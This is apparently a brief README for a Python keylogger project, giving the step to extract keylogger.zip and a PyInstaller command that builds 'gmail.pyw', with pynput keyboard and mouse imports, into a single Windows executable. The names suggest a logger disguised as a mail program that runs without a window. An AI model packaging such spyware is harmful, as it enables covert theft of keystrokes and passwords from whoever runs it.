# keylogger

# Compiled in WINDOWS
  --> Download and extract the files from the keylogger.zip
    pyinstaller --onefile --hidden-import pynput.keyboard._win32 --hidden-import pynput.mouse._win32 .\gmail.pyw
